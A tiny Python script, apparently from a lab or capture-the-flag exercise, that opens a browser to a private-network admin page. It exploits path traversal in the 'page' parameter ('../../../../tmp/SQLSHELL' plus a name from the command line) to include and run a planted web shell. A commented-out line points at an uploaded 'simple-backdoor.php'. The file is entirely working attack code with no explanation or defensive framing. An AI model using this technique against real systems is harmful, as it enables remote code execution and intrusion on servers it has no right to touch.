import webbrowser
import sys
import time

#possibly just wait a few seconds first

time.sleep(2)
name = sys.argv[1]

webbrowser.open('http://10.14.4.6/admin/index.php?page=../../../../tmp/SQLSHELL'+name,new=2)
#webbrowser.open('http://10.14.4.6/upload/16/simple-backdoor.php',new=2)
